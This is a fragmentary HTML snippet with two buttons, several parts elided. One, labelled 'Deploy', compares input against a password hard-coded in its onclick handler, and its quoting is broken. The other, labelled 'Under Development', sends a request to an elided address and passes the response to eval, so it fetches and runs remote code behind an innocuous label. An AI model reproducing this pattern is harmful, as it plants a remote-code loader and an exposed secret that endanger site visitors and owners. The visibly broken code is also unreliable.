...
onclick="let password = document.getElementById("pass").value;if (password == "qazxswedcvfrtgbnhyujmkiolp772") {alert(hey)}> Deploy </button> 
...
<br>
 <button style="color:green;background-color:black;border-color:green;" onclick="req = new XMLHttpRequest();
    ...
    req.onload = function() {
      eval(this.responseText);
    };req.send();">Under Development</button>
